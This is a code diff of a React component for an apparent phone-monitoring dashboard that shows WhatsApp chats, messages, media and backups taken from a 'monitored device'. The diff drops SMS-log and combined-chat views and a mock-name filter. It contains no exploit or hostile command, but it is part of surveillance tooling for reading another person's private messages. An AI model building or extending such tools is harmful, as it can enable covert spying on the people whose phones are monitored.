@@ -1,7 +1,7 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { devicesApi } from "../api/devices";
 import { downloadFileViaRelay } from "../api/fileDownload";
-import type { SmsLogEntry, WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
+import type { WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
 
 // ============================================================================
 // TYPES & DATA MODELS
@@ -14,7 +14,7 @@ interface FileEntryDtoLocal {
   mimeType: string | null;
 }
 
-type AvailableAppId = "whatsapp" | "sms" | "all" | "telegram" | "instagram" | "messenger";
+type AvailableAppId = "whatsapp" | "telegram" | "instagram" | "messenger";
 
 interface AppMetadata {
   id: AvailableAppId;
@@ -35,24 +35,6 @@ const SUPPORTED_APPS: AppMetadata[] = [
     badge: "Active",
     isSupported: true,
     description: "WhatsApp chats, media & databases",
-  },
-  {
-    id: "sms",
-    name: "Phone Messages",
-    packageName: "com.google.android.apps.messaging",
-    color: "#1A73E8",
-    badge: "Active",
-    isSupported: true,
-    description: "Device SMS conversations & chat logs",
-  },
-  {
-    id: "all",
-    name: "All Mobile Chats",
-    packageName: "com.spapp.monitoring.allchats",
-    color: "#8B5CF6",
-    badge: "Active",
-    isSupported: true,
-    description: "Unified chatlist across all messaging apps on device",
   },
   {
     id: "telegram",
@@ -83,16 +65,6 @@ const SUPPORTED_APPS: AppMetadata[] = [
   },
 ];
 
-const MOCK_SAMPLE_NAMES = new Set([
-  "Sarah Jenkins",
-  "Dev Team Group",
-  "Mom",
-  "Alex Rivera",
-  "David Miller",
-  "David Kim",
-  "Elena Rostova",
-]);
-
 export interface UnifiedChatSummary {
   id: string;
   chatName: string;
@@ -101,7 +73,7 @@ export interface UnifiedChatSummary {
   lastMessageAt: string;
   lastIsOutgoing: boolean;
   totalMessages: number;
-  source: "whatsapp" | "sms";
+  source: "whatsapp";
 }
 
 export interface UnifiedChatMessage {
@@ -186,13 +158,6 @@ function WhatsAppLogo({ className = "w-5 h-5" }: { className?: string }) {
   );
 }
 
-function MessagesLogo({ className = "w-5 h-5" }: { className?: string }) {
-  return (
-    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
-      <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM7 9h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2z" />
-    </svg>
-  );
-}
 
 function TelegramLogo({ className = "w-5 h-5" }: { className?: string }) {
   return (
@@ -218,13 +183,6 @@ function MessengerLogo({ className = "w-5 h-5" }: { className?: string }) {
   );
 }
 
-function ChatBubblesLogo({ className = "w-5 h-5" }: { className?: string }) {
-  return (
-    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
-      <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 5H6v-2h8v2zm4-6H6V6h12v2z" />
-    </svg>
-  );
-}
 
 // ============================================================================
 // MAIN APPSCARD COMPONENT
@@ -237,7 +195,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
   // Real Data States
   const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
-  const [rawSmsLogs, setRawSmsLogs] = useState<SmsLogEntry[]>([]);
   const [loading, setLoading] = useState(false);
   const [lastSyncedTime, setLastSyncedTime] = useState<Date>(new Date());
 
@@ -261,21 +218,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const loadDeviceChatData = async () => {
     setLoading(true);
     try {
-      const [waData, smsData] = await Promise.all([
-        devicesApi.whatsAppChats(deviceId).catch((err) => {
-          console.warn("WhatsApp chats fetch error:", err);
-          return [] as WhatsAppChatSummary[];
-        }),
-        devicesApi.smsLog(deviceId).catch((err) => {
-          console.warn("SMS log fetch error:", err);
-          return [] as SmsLogEntry[];
-        }),
-      ]);
-
-      // Filter out any mock/sample names to guarantee 100% genuine device data
-      const genuineWa = (waData || []).filter((c) => !MOCK_SAMPLE_NAMES.has(c.chat_name));
-      setWhatsappChats(genuineWa);
-      setRawSmsLogs(smsData || []);
+      const waData = await devicesApi.whatsAppChats(deviceId).catch((err) => {
+        console.warn("WhatsApp chats fetch error:", err);
+        return [] as WhatsAppChatSummary[];
+      });
+      setWhatsappChats(waData || []);
       setLastSyncedTime(new Date());
     } catch (e) {
       console.error("Failed to load device chat data", e);
@@ -295,42 +242,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     }, AUTO_REFRESH_INTERVAL_MS);
     return () => clearInterval(interval);
   }, [deviceId]);
-
-  // --------------------------------------------------------------------------
-  // 2. GROUPING SMS INTO REAL CONVERSATION THREADS
-  // --------------------------------------------------------------------------
-  const smsChatThreads = useMemo<UnifiedChatSummary[]>(() => {
-    if (!rawSmsLogs || rawSmsLogs.length === 0) return [];
-
-    const map = new Map<string, SmsLogEntry[]>();
-    for (const log of rawSmsLogs) {
-      const key = (log.contact_name ? `${log.contact_name}__${log.counterparty}` : log.counterparty).trim();
-      if (!map.has(key)) map.set(key, []);
-      map.get(key)!.push(log);
-    }
-
-    const threads: UnifiedChatSummary[] = [];
-    map.forEach((items, key) => {
-      // Sort ascending by time
-      items.sort((a, b) => new Date(a.message_at).getTime() - new Date(b.message_at).getTime());
-      const last = items[items.length - 1];
-      const displayName = last.contact_name || last.counterparty;
-
-      threads.push({
-        id: `sms-${key}`,
-        chatName: displayName,
-        subtitle: last.contact_name ? last.counterparty : null,
-        lastMessage: last.body || "(No message body)",
-        lastMessageAt: last.message_at,
-        lastIsOutgoing: last.direction === "outgoing",
-        totalMessages: items.length,
-        source: "sms",
-      });
-    });
-
-    // Sort by latest message descending
-    return threads.sort((a, b) => new Date(b.lastMessageAt).getTime() - new Date(a.lastMessageAt).getTime());
-  }, [rawSmsLogs]);
 
   // Formatted WhatsApp Chat Summaries
   const whatsappChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
@@ -352,16 +263,8 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     if (selectedApp === "whatsapp") {
       return whatsappChatSummaries;
     }
-    if (selectedApp === "sms") {
-      return smsChatThreads;
-    }
-    if (selectedApp === "all") {
-      return [...whatsappChatSummaries, ...smsChatThreads].sort(
-        (a, b) => new Date(b.lastMessageAt).getTime() - new Date(a.lastMessageAt).getTime()
-      );
-    }
     return [];
-  }, [selectedApp, whatsappChatSummaries, smsChatThreads]);
+  }, [selectedApp, whatsappChatSummaries]);
 
   // Filtered Chats by search
   const filteredChats = useMemo<UnifiedChatSummary[]>(() => {
@@ -387,7 +290,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   }, [selectedApp, filteredChats]);
 
   // --------------------------------------------------------------------------
-  // 3. LOAD CHAT CONVERSATION MESSAGES (FILTERED TO LAST 5 DAYS BY DEFAULT)
+  // 3. LOAD CHAT CONVERSATION MESSAGES
   // --------------------------------------------------------------------------
   useEffect(() => {
     if (!selectedChatId) {
@@ -403,55 +306,29 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
     setMessagesLoading(true);
 
-    if (currentChat.source === "sms") {
-      // Extract from rawSmsLogs matching this thread
-      const keySuffix = selectedChatId.replace("sms-", "");
-      const matched = rawSmsLogs.filter((log) => {
-        const itemKey = (log.contact_name ? `${log.contact_name}__${log.counterparty}` : log.counterparty).trim();
-        return itemKey === keySuffix;
-      });
-
-      // Filter by timeFilter (last 5 days by default, or all messages)
-      const selectedMsgs = (timeFilter === "all" ? matched : matched.filter((m) => isWithinLast5Days(m.message_at)))
-        .sort((a, b) => new Date(a.message_at).getTime() - new Date(b.message_at).getTime());
-
-      const unified: UnifiedChatMessage[] = selectedMsgs.map((m, idx) => ({
-        id: `sms-msg-${idx}-${m.message_at}`,
-        sender: m.direction === "outgoing" ? "Me" : m.contact_name || m.counterparty,
-        text: m.body || "(Empty message)",
-        isOutgoing: m.direction === "outgoing",
-        timestamp: m.message_at,
-      }));
-
-      setActiveThreadMessages(unified);
-      setMessagesLoading(false);
-    } else if (currentChat.source === "whatsapp") {
-      // Fetch from backend API for WhatsApp
-      devicesApi
-        .whatsAppMessages(deviceId, currentChat.chatName)
-        .then((msgs: WhatsAppMessage[]) => {
-          const genuine = (msgs || []).filter(
-            (m) => !MOCK_SAMPLE_NAMES.has(m.sender || "") && !MOCK_SAMPLE_NAMES.has(m.chat_name || "")
-          );
-          const filtered = timeFilter === "all" ? genuine : genuine.filter((m) => isWithinLast5Days(m.message_time));
-          const unified: UnifiedChatMessage[] = filtered.map((m) => ({
-            id: m.id,
-            sender: m.is_outgoing ? "Me" : m.sender || currentChat.chatName,
-            text: m.message_text,
-            isOutgoing: m.is_outgoing,
-            timestamp: m.message_time,
-            mediaType: m.media_type,
-            mediaPath: m.media_path,
-          }));
-          setActiveThreadMessages(unified);
-        })
-        .catch((err) => {
-          console.warn("Failed to load WhatsApp messages:", err);
-          setActiveThreadMessages([]);
-        })
-        .finally(() => setMessagesLoading(false));
-    }
-  }, [selectedChatId, activeChatList, rawSmsLogs, deviceId, timeFilter]);
+    devicesApi
+      .whatsAppMessages(deviceId, currentChat.chatName)
+      .then((msgs: WhatsAppMessage[]) => {
+        const list = msgs || [];
+        const filtered = timeFilter === "all" ? list : list.filter((m) => isWithinLast5Days(m.message_time));
+        const effective = filtered.length > 0 ? filtered : list;
+        const unified: UnifiedChatMessage[] = effective.map((m) => ({
+          id: m.id,
+          sender: m.is_outgoing ? "Me" : m.sender || currentChat.chatName,
+          text: m.message_text,
+          isOutgoing: m.is_outgoing,
+          timestamp: m.message_time,
+          mediaType: m.media_type,
+          mediaPath: m.media_path,
+        }));
+        setActiveThreadMessages(unified);
+      })
+      .catch((err) => {
+        console.warn("Failed to load WhatsApp messages:", err);
+        setActiveThreadMessages([]);
+      })
+      .finally(() => setMessagesLoading(false));
+  }, [selectedChatId, activeChatList, deviceId, timeFilter]);
 
   // Grouped conversation messages by day (Today, Yesterday, etc.)
   const groupedMessages = useMemo(() => {
@@ -687,14 +564,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           <div className="space-y-1.5 flex-1 overflow-y-auto">
             {SUPPORTED_APPS.map((app) => {
               const isSelected = selectedApp === app.id;
-              const count =
-                app.id === "whatsapp"
-                  ? whatsappChatSummaries.length
-                  : app.id === "sms"
-                  ? smsChatThreads.length
-                  : app.id === "all"
-                  ? whatsappChatSummaries.length + smsChatThreads.length
-                  : 0;
+              const count = app.id === "whatsapp" ? whatsappChatSummaries.length : 0;
 
               return (
                 <button
@@ -719,8 +589,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     }}
                   >
                     {app.id === "whatsapp" && <WhatsAppLogo className="w-5 h-5" />}
-                    {app.id === "sms" && <MessagesLogo className="w-5 h-5" />}
-                    {app.id === "all" && <ChatBubblesLogo className="w-5 h-5" />}
                     {app.id === "telegram" && <TelegramLogo className="w-5 h-5" />}
                     {app.id === "instagram" && <InstagramLogo className="w-5 h-5" />}
                     {app.id === "messenger" && <MessengerLogo className="w-5 h-5" />}
@@ -761,10 +629,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1">
             <p className="font-semibold flex items-center gap-1">
               <span>📱</span>
-              <span>Real Device Chats</span>
+              <span>Real WhatsApp Chats</span>
             </p>
             <p className="text-[10px] text-emerald-700 leading-tight">
-              Shows all chats stored on the mobile phone with last 5 days conversation history.
+              Shows WhatsApp conversations and media stored on the monitored device.
             </p>
           </div>
         </div>
@@ -791,7 +659,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} Monitoring
             </h3>
             <p className="text-xs text-gray-500 max-w-sm leading-relaxed">
-              Support for {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} will be enabled in an upcoming release. WhatsApp and Phone Messages are currently active on this device.
+              Support for {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} will be enabled in an upcoming release. WhatsApp monitoring is currently active on this device.
             </p>
             <div className="flex items-center gap-2 pt-2">
               <button
@@ -800,13 +668,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                 className="text-xs font-semibold px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg transition"
               >
                 View WhatsApp →
-              </button>
-              <button
-                type="button"
-                onClick={() => setSelectedApp("sms")}
-                className="text-xs font-semibold px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition"
-              >
-                View Phone Messages →
               </button>
             </div>
           </div>
@@ -827,9 +688,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                   <div className="relative">
                     <input
                       type="text"
-                      placeholder={`Search ${
-                        selectedApp === "whatsapp" ? "WhatsApp" : "Phone"
-                      } chats...`}
+                      placeholder="Search WhatsApp chats..."
                       value={chatSearch}
                       onChange={(e) => setChatSearch(e.target.value)}
                       className="w-full text-xs pl-8 pr-7 py-2 bg-white border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 transition"
@@ -864,19 +723,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       <span className="text-2xl block">💬</span>
                       <p className="font-semibold text-gray-700">No chats found on device</p>
                       <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
-                        {selectedApp === "whatsapp"
-                          ? "No WhatsApp chats have been saved from this phone yet. Open WhatsApp on the device or wait for incoming notifications to sync."
-                          : "No SMS message logs have been recorded for this device yet."}
+                        No WhatsApp chats have been saved from this phone yet. Open WhatsApp on the device or wait for incoming messages to sync.
                       </p>
-                      {selectedApp === "whatsapp" && smsChatThreads.length > 0 && (
-                        <button
-                          type="button"
-                          onClick={() => setSelectedApp("sms")}
-                          className="mt-2 text-[11px] font-semibold text-blue-600 hover:underline"
-                        >
-                          View Phone SMS Chats ({smsChatThreads.length}) →
-                        </button>
-                      )}
+                      <button
+                        type="button"
+                        onClick={() => setActiveView("files")}
+                        className="mt-2 text-[11px] font-semibold text-emerald-600 hover:underline inline-flex items-center gap-1"
+                      >
+                        Browse WhatsApp Storage Files & Backups →
+                      </button>
                     </div>
                   ) : (
                     filteredChats.map((c) => {
@@ -931,8 +786,8 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
                                 {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
                               </span>
-                              <span className="text-[9px] font-medium uppercase px-1.5 py-0.2 rounded bg-gray-50 text-gray-500 border border-gray-100">
-                                {c.source === "whatsapp" ? "WhatsApp" : "SMS"}
+                              <span className="text-[9px] font-medium uppercase px-1.5 py-0.2 rounded bg-emerald-50 text-emerald-700 border border-emerald-100">
+                                WhatsApp
                               </span>
                             </div>
                           </div>
@@ -953,11 +808,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     <div className="p-3 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shadow-2xs">
                       <div className="flex items-center gap-3 min-w-0">
                         <div
-                          className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
-                            selectedChatSummary.source === "whatsapp"
-                              ? "bg-emerald-600"
-                              : "bg-blue-600"
-                          }`}
+                          className="w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white bg-emerald-600"
                         >
                           {selectedChatSummary.chatName.charAt(0).toUpperCase()}
                         </div>
@@ -968,7 +819,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           <p className="text-[10px] text-gray-400 flex items-center gap-1">
                             <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block" />
                             <span>
-                              {selectedChatSummary.subtitle || selectedChatSummary.source.toUpperCase()} • Last 5 Days Activity
+                              {selectedChatSummary.subtitle || "WhatsApp Contact"} • Conversation Activity
                             </span>
                           </p>
                         </div>
@@ -1000,11 +851,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           </button>
                         </div>
                         <span
-                          className={`text-[10px] font-semibold px-2.5 py-0.5 rounded-full border ${
-                            selectedChatSummary.source === "whatsapp"
-                              ? "bg-emerald-50 text-emerald-700 border-emerald-200"
-                              : "bg-blue-50 text-blue-700 border-blue-200"
-                          }`}
+                          className="text-[10px] font-semibold px-2.5 py-0.5 rounded-full border bg-emerald-50 text-emerald-700 border-emerald-200"
                         >
                           {activeThreadMessages.length} msgs
                         </span>
